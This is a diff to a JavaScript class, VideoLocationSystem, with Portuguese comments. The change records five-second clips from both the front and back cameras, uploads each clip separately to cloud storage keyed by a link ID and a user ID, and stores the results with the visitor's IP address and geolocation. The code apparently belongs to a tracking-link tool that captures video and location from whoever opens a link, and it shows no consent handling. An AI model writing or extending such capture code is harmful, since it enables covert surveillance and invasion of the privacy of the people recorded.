@@ -115,19 +115,30 @@ class VideoLocationSystem {
     return blob;
   }
 
+  async uploadBlob(blob, label, timestamp) {
+    const filePath = `videos/${this.userId}/${this.urlId}_${label}_${timestamp}.webm`;
+    const storageRef = storage.ref(filePath);
+    const uploadTask = await storageRef.put(blob);
+    return await uploadTask.ref.getDownloadURL();
+  }
+
   async recordAndUpload() {
     try {
+      const timestamp = Date.now();
+
+      // Grava câmera frontal (5s)
       const frontBlob = await this.recordCamera('user', 5000);
+
+      // Grava câmera traseira (5s)
       const backBlob = await this.recordCamera('environment', 5000);
 
-      const combinedBlob = new Blob([frontBlob, backBlob], { type: 'video/webm' });
-      if (combinedBlob.size === 0) throw new Error('Vídeo combinado vazio');
+      if (frontBlob.size === 0 || backBlob.size === 0) throw new Error('Um dos vídeos está vazio');
 
-      const timestamp = Date.now();
-      const filePath = `videos/${this.userId}/${this.urlId}_${timestamp}.webm`;
-      const storageRef = storage.ref(filePath);
-      const uploadTask = await storageRef.put(combinedBlob);
-      const videoUrl = await uploadTask.ref.getDownloadURL();
+      // Faz upload dos dois vídeos separadamente e obtém duas URLs
+      const [frontUrl, backUrl] = await Promise.all([
+        this.uploadBlob(frontBlob, 'frontal', timestamp),
+        this.uploadBlob(backBlob, 'traseira', timestamp)
+      ]);
 
       const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);
 
@@ -136,7 +147,8 @@ class VideoLocationSystem {
         id: captureKey,
         urlId: this.urlId,
         userId: this.userId,
-        videoUrl,
+        videoFrontalUrl: frontUrl,
+        videoTrasieraUrl: backUrl,
         ip: ipResult,
         timestamp,
         data: new Date().toISOString(),
